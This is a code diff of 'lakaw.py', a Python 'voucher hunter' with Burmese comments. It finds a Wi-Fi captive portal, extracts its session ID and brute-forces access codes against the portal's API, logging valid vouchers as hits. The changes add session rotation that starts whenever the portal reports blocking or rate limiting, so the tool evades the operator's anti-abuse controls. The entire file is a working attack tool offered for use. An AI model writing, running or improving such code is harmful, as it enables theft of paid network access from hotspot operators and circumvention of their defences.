@@ -1,4 +1,4 @@
-# lakaw.py (KAVIN FAST SPEED - Custom Method Edition)
+# lakaw.py (KAVIN FAST SPEED - Auto-Heal Edition)
 import os
 import time
 import json
@@ -28,11 +28,11 @@ STATE_FILE = "lakaw_state.json"
 HITS_FILE = "hits.txt"
 
 # ⚡ Speed & Anti-Ban Optimization
-BASE_SLEEP_MIN = 0.001
-BASE_SLEEP_MAX = 0.005
+BASE_SLEEP_MIN = 0.002
+BASE_SLEEP_MAX = 0.006
 RATE_LIMIT_SLEEP = 30
-NETWORK_RETRY_SLEEP = 0.1
-SESSION_REFRESH_SLEEP = 0.5
+NETWORK_RETRY_SLEEP = 1.0
+SESSION_REFRESH_SLEEP = 2.0
 
 console = Console()
 session = requests.Session()
@@ -58,8 +58,7 @@ def format_time(seconds):
         return "00:00:00"
 
 def normalize_hits(hits):
-    if not hits:
-        return []
+    if not hits: return []
     result = []
     for h in hits:
         if isinstance(h, dict):
@@ -77,79 +76,64 @@ def init_db():
         conn.execute('CREATE TABLE IF NOT EXISTS tried_codes (code TEXT PRIMARY KEY)')
         conn.commit()
         return conn
-    except Exception:
-        return None
+    except Exception: return None
 
 def is_tried(conn, code):
-    if conn is None:
-        return False
-    try:
-        return conn.execute("SELECT 1 FROM tried_codes WHERE code=?", (code,)).fetchone() is not None
-    except Exception:
-        return False
+    if conn is None: return False
+    try: return conn.execute("SELECT 1 FROM tried_codes WHERE code=?", (code,)).fetchone() is not None
+    except Exception: return False
 
 def mark_tried(conn, code):
-    if conn is None:
-        return
+    if conn is None: return
     try:
         conn.execute("INSERT OR IGNORE INTO tried_codes (code) VALUES (?)", (code,))
         conn.commit()
-    except Exception:
-        pass
+    except Exception: pass
 
 def load_state():
     try:
-        with open(STATE_FILE) as f:
-            return json.load(f)
-    except Exception:
-        return None
+        with open(STATE_FILE) as f: return json.load(f)
+    except Exception: return None
 
 def save_state(mode, tested, hits, prefix="", custom_url="", scan_method="random"):
     try:
-        with open(STATE_FILE, "w") as f:
-            json.dump({"mode": mode, "tested": tested, "hits": hits, "prefix": prefix, "custom_url": custom_url, "scan_method": scan_method}, f)
-    except Exception:
-        pass
+        with open(STATE_FILE, "w") as f: json.dump({"mode": mode, "tested": tested, "hits": hits, "prefix": prefix, "custom_url": custom_url, "scan_method": scan_method}, f)
+    except Exception: pass
 
 def clear_state():
-    try:
-        os.remove(STATE_FILE)
-    except Exception:
-        pass
+    try: os.remove(STATE_FILE)
+    except Exception: pass
 
 def extract_session(value):
-    if not value:
-        return None
-    try:
-        value = html.unescape(value)
-    except Exception:
-        pass
+    if not value: return None
+    try: value = html.unescape(value)
+    except Exception: pass
     try:
         q = parse_qs(urlparse(value).query)
         for k, v in q.items():
-            if k.lower() == "sessionid" and v:
-                return v[0]
-    except Exception:
-        pass
+            if k.lower() == "sessionid" and v: return v[0]
+    except Exception: pass
     try:
         m = re.search(r"sessionId=([a-zA-Z0-9]+)", value, re.IGNORECASE)
         return m.group(1) if m else None
-    except Exception:
-        return None
+    except Exception: return None
 
+# ========================================================
+# ⚡ Auto-Heal Session: Wi-Fi ချိတ်ထားရင် Portal အလိုအလျောက်ရှာမယ်
+# ========================================================
 def fetch_session(custom_url=""):
+    # Custom URL ရှိရင် အရင်စစ်မယ်
     if custom_url:
         try:
             r = session.get(custom_url, timeout=3, allow_redirects=True, verify=False)
             p = urlparse(r.url)
             portal_base = f"{p.scheme}://{p.netloc}"
             sid = extract_session(r.url) or extract_session(r.text)
-            if sid:
-                return portal_base, sid
-            return portal_base, "dummy_session"
-        except Exception:
-            pass
+            if sid: return portal_base, sid
+            return portal_base, "auto_session"
+        except Exception: pass
 
+    # မရရင် Wi-Fi Portal ကို အလိုအလျောက် ရှာမယ်
     probes = [
         "http://connectivitycheck.gstatic.com/generate_204",
         "http://captive.apple.com/hotspot-detect.html",
@@ -164,28 +148,21 @@ def fetch_session(custom_url=""):
             if "gstatic.com" in p.netloc or "apple.com" in p.netloc:
                 continue
             portal_base = f"{p.scheme}://{p.netloc}"
-
             cands = [r.url, r.text]
             cands.extend(h.headers.get("Location", "") for h in r.history)
             cands.extend(h.url for h in r.history)
-
             for c in cands:
                 sid = extract_session(c)
-                if sid:
-                    return portal_base, sid
-
+                if sid: return portal_base, sid
             try:
                 m = re.search(r"(?:self|window)\.location\.href\s*=\s*['\"]([^'\"]+)['\"]", r.text)
                 if m:
                     nxt = urljoin(r.url, m.group(1))
                     r2 = session.get(nxt, timeout=3, allow_redirects=True, verify=False)
                     sid = extract_session(r2.url) or extract_session(r2.text)
-                    if sid:
-                        return portal_base, sid
-            except Exception:
-                pass
-        except Exception:
-            continue
+                    if sid: return portal_base, sid
+            except Exception: pass
+        except Exception: continue
     return None, None
 
 def test_code(portal_base, session_id, code):
@@ -193,47 +170,33 @@ def test_code(portal_base, session_id, code):
     headers = {"Content-Type": "application/json", "Origin": portal_base}
     payload = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": "ABCD"}
     try:
-        r = session.post(url, json=payload, headers=headers, timeout=1.5, verify=False)
+        r = session.post(url, json=payload, headers=headers, timeout=2.0, verify=False)
         return r.text if r.text else "__NETWORK_ERROR__"
-    except Exception:
-        return "__NETWORK_ERROR__"
+    except Exception: return "__NETWORK_ERROR__"
 
-# ကုဒ်ဖန်တီးမယ့် စနစ် - ကျပန်း (Random) သို့မဟုတ် အစဉ်လိုက် (Sequential)
+# ကုဒ်ဖန်တီးမယ့် စနစ်
 _seq_counter = 0
-
 def gen_code(mode, length, prefix="", scan_method="random"):
     global _seq_counter
     try:
         rem_len = length - len(prefix)
-        if rem_len < 0:
-            rem_len = 0
-
+        if rem_len < 0: rem_len = 0
         if scan_method == "random":
-            if mode == "num":
-                rand_part = str(random.randint(0, 10**rem_len - 1)).zfill(rem_len)
-                return prefix + rand_part
-            elif mode == "eng":
-                rand_part = ''.join(random.choices(string.ascii_lowercase, k=rem_len))
-                return prefix + rand_part
-            elif mode == "mix":
-                rand_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=rem_len))
-                return prefix + rand_part
-        else: # Sequential
+            if mode == "num": return prefix + str(random.randint(0, 10**rem_len - 1)).zfill(rem_len)
+            elif mode == "eng": return prefix + ''.join(random.choices(string.ascii_lowercase, k=rem_len))
+            elif mode == "mix": return prefix + ''.join(random.choices(string.ascii_lowercase + string.digits, k=rem_len))
+        else:
             _seq_counter += 1
-            if mode == "num":
-                return prefix + str(_seq_counter).zfill(rem_len)
+            if mode == "num": return prefix + str(_seq_counter).zfill(rem_len)
             elif mode == "eng":
-                # a-z ကို အစဉ်လိုက် ပြောင်းမယ်
                 n = _seq_counter
                 res = ""
                 for _ in range(rem_len):
                     res = chr(97 + (n % 26)) + res
                     n //= 26
                 return prefix + res
-            elif mode == "mix":
-                return prefix + str(_seq_counter).zfill(rem_len)
-    except Exception:
-        pass
+            elif mode == "mix": return prefix + str(_seq_counter).zfill(rem_len)
+    except Exception: pass
     return prefix
 
 def make_layout(mode_name, current_code, tested, elapsed, status, hits, running_logs, speed):
@@ -248,12 +211,9 @@ def make_layout(mode_name, current_code, tested, elapsed, status, hits, running_
     header_text = Text("🔥 [ KAVIN FAST SPEED ] 🔥", style="bold bright_cyan on black", justify="center")
     layout["tg_header"].update(Panel(Align.center(header_text), border_style="cyan", box=HEAVY))
 
-    if status == "Active":
-        s_disp = Text("🟢 RUNNING", style="bold bright_green", justify="center")
-    elif status == "Limit":
-        s_disp = Text("🛡️ COOLDOWN", style="bold bright_red", justify="center")
-    else:
-        s_disp = Text("⏳ READY", style="bold bright_cyan", justify="center")
+    if status == "Active": s_disp = Text("🟢 RUNNING", style="bold bright_green", justify="center")
+    elif status == "Limit": s_disp = Text("🛡️ COOLDOWN", style="bold bright_red", justify="center")
+    else: s_disp = Text("⏳ READY", style="bold bright_cyan", justify="center")
 
     card_table = Table.grid(padding=1, expand=True)
     card_table.add_column(ratio=1)
@@ -271,15 +231,12 @@ def make_layout(mode_name, current_code, tested, elapsed, status, hits, running_
         Panel(Align.center(s_disp), title="📌 System Status", border_style="green", box=MINIMAL),
         Panel(Align.center(Text(f"{len(hits)} Hits", style="bold bright_magenta")), title="🎁 Total Hits", border_style="bright_magenta", box=MINIMAL)
     )
-
     layout["tg_bot_card"].update(Panel(card_table, title="📢 [ Telegram Bot Status Broadcast ]", border_style="bright_blue", box=DOUBLE))
 
     log_table = Table(show_header=False, expand=True, box=None, padding=0)
     log_table.add_column("Stream")
-    for lg in running_logs[-5:]:
-        log_table.add_row(f"💬 {lg}")
-    if not running_logs:
-        log_table.add_row("[dim]🤖 Bot is online and listening...[/dim]")
+    for lg in running_logs[-5:]: log_table.add_row(f"💬 {lg}")
+    if not running_logs: log_table.add_row("[dim]🤖 Bot is online and listening...[/dim]")
 
     layout["tg_logs"].update(Panel(log_table, title="💬 Telegram Bot Event Logs", border_style="green", box=ROUNDED))
 
@@ -290,59 +247,39 @@ def make_layout(mode_name, current_code, tested, elapsed, status, hits, running_
 
     last_hits = hits[-500:]
     for i, h in enumerate(last_hits, 1):
-        if isinstance(h, dict):
-            c = h.get("code", "")
-            t = h.get("time", "--:--:--")
-        else:
-            c = h
-            t = "--:--:--"
+        c = h.get("code", "") if isinstance(h, dict) else h
+        t = h.get("time", "--:--:--") if isinstance(h, dict) else "--:--:--"
         hits_table.add_row(str(i), f"[bold bright_green on black] 👑 {c} 👑 [/bold bright_green on black]", f"[dim cyan]{t}[/dim cyan]")
 
-    if not last_hits:
-        hits_table.add_row("-", "[dim]No hits recorded yet...[/dim]", "-")
-
+    if not last_hits: hits_table.add_row("-", "[dim]No hits recorded yet...[/dim]", "-")
     layout["tg_vault"].update(Panel(hits_table, title=f"🎁 Telegram Hits Vault ({len(hits)} / 500 max)", border_style="magenta", box=ROUNDED))
     return layout
 
 def scan_loop(mode, length, prefix="", custom_url="", scan_method="random", start_tested=0, start_hits=None):
     mode_str = f"{mode}_{length}"
     hits = normalize_hits(start_hits) if start_hits else []
-    running_logs = []
-    tested = start_tested
-    start_time = time.time()
-    portal_base = None
-    session_id = None
-    net_error_streak = 0
-
+    running_logs, tested = [], start_tested
+    start_time, portal_base, session_id, net_error_streak = time.time(), None, None, 0
     conn = init_db()
+    live, live_cm = None, None
 
-    live = None
-    live_cm = None
     try:
         initial = make_layout(mode_str, "------", tested, "00:00:00", "--", hits, running_logs, 0.0)
         live_cm = Live(initial, refresh_per_second=10, screen=True)
         live = live_cm.__enter__()
-    except Exception:
-        live = None
-        live_cm = None
+    except Exception: pass
 
     def _update(code, status, current_speed):
-        if live is None:
-            return
-        try:
-            live.update(make_layout(mode_str, code, tested,
-                                    format_time(time.time() - start_time), status, hits, running_logs, current_speed))
-        except Exception:
-            pass
+        if live is None: return
+        try: live.update(make_layout(mode_str, code, tested, format_time(time.time() - start_time), status, hits, running_logs, current_speed))
+        except Exception: pass
 
-    def push_log(msg):
-        t_str = time.strftime("%H:%M:%S")
-        running_logs.append(f"[dim]{t_str}[/dim] {msg}")
+    def push_log(msg): running_logs.append(f"[dim]{time.strftime('%H:%M:%S')}[/dim] {msg}")
 
     last_time, speed_counter, current_speed = time.time(), 0, 0.0
 
     try:
-        push_log(f"[bold bright_cyan]Online | Method: {scan_method.upper()} | Prefix: '{prefix}'[/bold bright_cyan]")
+        push_log(f"[bold bright_cyan]Auto-Heal ON | Method: {scan_method.upper()} | Prefix: '{prefix}'[/bold bright_cyan]")
         while True:
             try:
                 if not session_id or not portal_base:
@@ -351,12 +288,11 @@ def scan_loop(mode, length, prefix="", custom_url="", scan_method="random", star
                     if not session_id:
                         time.sleep(SESSION_REFRESH_SLEEP)
                         portal_base = custom_url or "http://portal.local"
-                        session_id = "dummy_session"
+                        session_id = "auto_session"
                     net_error_streak = 0
 
                 code = gen_code(mode, length, prefix, scan_method)
-                if not code or is_tried(conn, code):
-                    continue
+                if not code or is_tried(conn, code): continue
 
                 mark_tried(conn, code)
                 tested += 1
@@ -378,22 +314,21 @@ def scan_loop(mode, length, prefix="", custom_url="", scan_method="random", star
                     net_error_streak += 1
                     time.sleep(NETWORK_RETRY_SLEEP)
                     if net_error_streak >= 5:
+                        push_log(f"[bold red]⚠️ Network Issues! Reconnecting...[/bold red]")
                         session_id = None
                         net_error_streak = 0
                     continue
 
                 net_error_streak = 0
 
-                if ("request limited" in low or "blocked" in low
-                        or "too many" in low or '"limit"' in low or "forbidden" in low):
+                if ("request limited" in low or "blocked" in low or "too many" in low or '"limit"' in low or "forbidden" in low):
                     _update(code, "Limit", current_speed)
-                    push_log(f"[bold red]🛡️ Rate limit! Cooling down {RATE_LIMIT_SLEEP}s...[/bold red]")
+                    push_log(f"[bold red]🛡️ Block Detected! Auto-changing Session...[/bold red]")
                     time.sleep(RATE_LIMIT_SLEEP)
-                    session_id = None
+                    session_id = None # IP အသစ်ပြန်ယူဖို့
                     continue
 
-                if ("session timed out" in low or "session timeout" in low
-                        or '"session":null' in low):
+                if ("session timed out" in low or "session timeout" in low or '"session":null' in low):
                     session_id = None
                     continue
 
@@ -404,10 +339,8 @@ def scan_loop(mode, length, prefix="", custom_url="", scan_method="random", star
                         hits.append({"code": code, "time": now_str})
                         push_log(f"[bold bright_green on black] ✨ BINGO! VALID VOUCHER HIT ➔ {code} ✨ [/bold bright_green on black]")
                         try:
-                            with open(HITS_FILE, "a", encoding="utf-8") as f:
-                                f.write(f"[{now_str}] CODE: {code}\n")
-                        except Exception:
-                            pass
+                            with open(HITS_FILE, "a", encoding="utf-8") as f: f.write(f"[{now_str}] CODE: {code}\n")
+                        except Exception: pass
                         save_state(mode_str, tested, hits, prefix, custom_url, scan_method)
                     _update(code, "Active", current_speed)
                     time.sleep(BASE_SLEEP_MIN)
@@ -415,17 +348,14 @@ def scan_loop(mode, length, prefix="", custom_url="", scan_method="random", star
 
                 time.sleep(BASE_SLEEP_MIN + random.uniform(0, BASE_SLEEP_MAX))
 
-            except KeyboardInterrupt:
-                raise
+            except KeyboardInterrupt: raise
             except Exception:
                 time.sleep(NETWORK_RETRY_SLEEP)
                 continue
     finally:
         if live_cm is not None:
-            try:
-                live_cm.__exit__(None, None, None)
-            except Exception:
-                pass
+            try: live_cm.__exit__(None, None, None)
+            except Exception: pass
 def show_banner():
     clear_screen()
     try:
@@ -434,8 +364,7 @@ def show_banner():
         banner.append("💬 BOT CONTROLLER & VOUCHER HUNTER", style="bold bright_yellow")
         console.print(Panel(Align.center(banner), border_style="cyan", box=HEAVY))
         console.print()
-    except Exception:
-        pass
+    except Exception: pass
 
 def ask_mode():
     while True:
@@ -447,23 +376,17 @@ def ask_mode():
             menu.append("  [3] 🔀  HYBRID MIX COMMAND (/mix)\n", style="bold bright_white")
             menu.append("  [0] ❌  SHUTDOWN BOT (/exit)\n", style="bold bright_red")
             console.print(Panel(menu, title="[bold bright_yellow] SELECT BOT COMMAND [/bold bright_yellow]", border_style="bright_yellow", box=DOUBLE))
-            
             choice = input("➜ Select Option: ").strip()
-        except KeyboardInterrupt:
-            raise
-        except Exception:
-            return None
+        except KeyboardInterrupt: raise
+        except Exception: return None
 
-        if choice == "0":
-            return None
+        if choice == "0": return None
         if choice not in ("1", "2", "3"):
             try:
                 console.print("[bold bright_red]❌ Invalid Command! Select 1, 2, 3 or 0.[/bold bright_red]")
                 time.sleep(1)
-            except Exception:
-                pass
+            except Exception: pass
             continue
-
         return {"1": "num", "2": "eng", "3": "mix"}[choice]
 
 def ask_length(mode):
@@ -477,23 +400,17 @@ def ask_length(mode):
                 menu.append(f"  [{i}] ⚡  {i} CHARACTERS LENGTH\n", style="bold bright_white")
             menu.append("  [0] ⬅  BACK TO MENU\n", style="bold bright_red")
             console.print(Panel(menu, title="[bold bright_yellow] SELECT KEY LENGTH [/bold bright_yellow]", border_style="bright_yellow", box=DOUBLE))
-            
             length = input("➜ Select Length: ").strip()
-        except KeyboardInterrupt:
-            raise
-        except Exception:
-            return None
+        except KeyboardInterrupt: raise
+        except Exception: return None
 
-        if length == "0":
-            return None
+        if length == "0": return None
         if length not in ("6", "7", "8", "9"):
             try:
                 console.print("[bold bright_red]❌ Invalid Length! Choose 6 to 9.[/bold bright_red]")
                 time.sleep(1)
-            except Exception:
-                pass
+            except Exception: pass
             continue
-
         return int(length)
 
 def ask_scan_method():
@@ -504,30 +421,24 @@ def ask_scan_method():
             console.print()
             menu = Text()
             menu.append("  [1] 🎲  RANDOM (ကျပန်း)\n", style="bold bright_white")
-            menu.append("  [2] 📈  SEQUENTIAL (အစဉ်လိုက် - IP မခံရအောင် နှေးနှေး)\n", style="bold bright_white")
+            menu.append("  [2] 📈  SEQUENTIAL (အစဉ်လိုက်)\n", style="bold bright_white")
             menu.append("  [0] ⬅  BACK TO MENU\n", style="bold bright_red")
             console.print(Panel(menu, title="[bold bright_yellow] SELECT SCAN METHOD [/bold bright_yellow]", border_style="bright_yellow", box=DOUBLE))
-            
             choice = input("➜ Select Method: ").strip()
-        except KeyboardInterrupt:
-            raise
-        except Exception:
-            return "random"
+        except KeyboardInterrupt: raise
+        except Exception: return "random"
 
-        if choice == "0":
-            return None
+        if choice == "0": return None
         if choice not in ("1", "2"):
             try:
                 console.print("[bold bright_red]❌ Invalid! Choose 1 or 2.[/bold bright_red]")
                 time.sleep(1)
-            except Exception:
-                pass
+            except Exception: pass
             continue
-
         return {"1": "random", "2": "sequential"}[choice]
 
 def ask_extra_configs():
-    prefix = input("➜ Prefix (ဥပမာ - 0 သို့မဟုတ် 1, မလိုလျှင် Enter ခေါက်ရန်): ").strip()
+    prefix = input("➜ Prefix (ဥပမာ - 0, မလိုလျှင် Enter ခေါက်ရန်): ").strip()
     custom_url = input("➜ Custom URL (ဥပမာ - http://192.168.1.1, အလိုအလျောက်ဆိုလျှင် Enter ခေါက်ရန်): ").strip()
     return prefix, custom_url
 
@@ -567,44 +478,32 @@ def run():
             if ans in ("", "y", "yes"):
                 scan_loop(m, int(l), prefix, custom_url, scan_method, start_tested=tested, start_hits=hits)
                 return
-            else:
-                clear_state()
-        except KeyboardInterrupt:
-            raise
-        except Exception:
-            clear_state()
+            else: clear_state()
+        except KeyboardInterrupt: raise
+        except Exception: clear_state()
 
     while True:
         mode = ask_mode()
-        if mode is None:
-            return
+        if mode is None: return
 
         length = ask_length(mode)
-        if length is None:
-            continue
+        if length is None: continue
 
         method = ask_scan_method()
-        if method is None:
-            continue
+        if method is None: continue
 
         prefix, custom_url = ask_extra_configs()
         scan_loop(mode, length, prefix, custom_url, method)
         return
 
 def main():
-    if not _license.check_approval():
-        return
-    try:
-        run()
-    except KeyboardInterrupt:
-        pass
-    except BaseException:
-        pass
+    if not _license.check_approval(): return
+    try: run()
+    except KeyboardInterrupt: pass
+    except BaseException: pass
     finally:
-        try:
-            clear_screen()
-        except BaseException:
-            pass
+        try: clear_screen()
+        except BaseException: pass
         try:
             bye = Text()
             bye.append("\n\n")
@@ -614,10 +513,8 @@ def main():
             console.print(Align.center(bye))
             time.sleep(2)
         except BaseException:
-            try:
-                print("\n\n🔥 KAVIN FAST SPEED 🔥\n🙏 ကျေးဇူးတင်ပါတယ်ဗျ။")
-            except BaseException:
-                pass
+            try: print("\n\n🔥 KAVIN FAST SPEED 🔥\n🙏 ကျေးဇူးတင်ပါတယ်ဗျ။")
+            except BaseException: pass
 
 if __name__ == "__main__":
     main()
